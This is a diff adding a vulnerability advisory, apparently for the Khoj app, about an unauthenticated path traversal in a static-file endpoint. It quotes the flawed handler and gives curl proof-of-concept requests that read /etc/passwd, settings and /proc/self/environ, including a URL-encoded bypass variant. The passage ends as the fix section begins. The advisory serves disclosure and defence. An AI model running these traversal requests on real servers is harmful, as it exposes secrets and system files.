@@ -1,0 +1,48 @@
+Summary
+The /home/{file_path:path} endpoint in web_client.py serves static files by directly concatenating the user-supplied file_path with the home_directory constant. There is no path traversal filtering, no path normalization check, and no authentication required. An attacker can use ../ sequences to read arbitrary files from the server filesystem.
+
+Details
+Vulnerable code — src/khoj/routers/web_client.py lines 46-49:
+
+@web_client.get("/home/{file_path:path}", response_class=FileResponse)
+def home_static_files(file_path: str):
+    """Serve static files from the home landing page directory"""
+    return FileResponse(constants.home_directory / file_path)
+Where home_directory is defined in src/khoj/utils/constants.py line 6:
+
+home_directory = web_directory / "home/"
+What is missing:
+
+No .. traversal filtering
+No path normalization/resolution check (e.g., resolved.is_relative_to(home_directory))
+No authentication decorator (@requires(["authenticated"]) is absent)
+Starlette's FileResponse does NOT perform path traversal protection
+Path resolution:
+
+Request: GET /home/../../../../../../../etc/passwd
+file_path = "../../../../../../../etc/passwd"
+home_directory / file_path = /app/src/khoj/interface/web/home/../../../../../../../etc/passwd
+OS resolves to: /etc/passwd
+PoC
+# Read /etc/passwd (no authentication required)
+curl http://localhost:42110/home/../../../../../../../etc/passwd
+
+# Read application settings (may contain SECRET_KEY, DB credentials)
+curl http://localhost:42110/home/../../../../settings.py
+
+# Read environment file
+curl http://localhost:42110/home/../../../../../../../proc/self/environ
+URL-encoded variant (may bypass some reverse proxy normalization):
+
+curl http://localhost:42110/home/..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+Impact
+Unauthenticated arbitrary file read. An attacker with network access to the Khoj instance can:
+
+Read application configuration — Django SECRET_KEY, database credentials, API keys
+Read system files — /etc/passwd, /etc/shadow (if permissions allow), /proc/self/environ
+Exfiltrate sensitive data — Any file readable by the server process
+Facilitate further attacks — Leaked credentials enable deeper compromise
+No authentication required — the endpoint has no auth decorators, making it exploitable by any network-reachable attacker.
+
+Recommended fix
+Use FastAPI's built-in StaticFiles mount instead of a custom handler, or add explicit path validation:
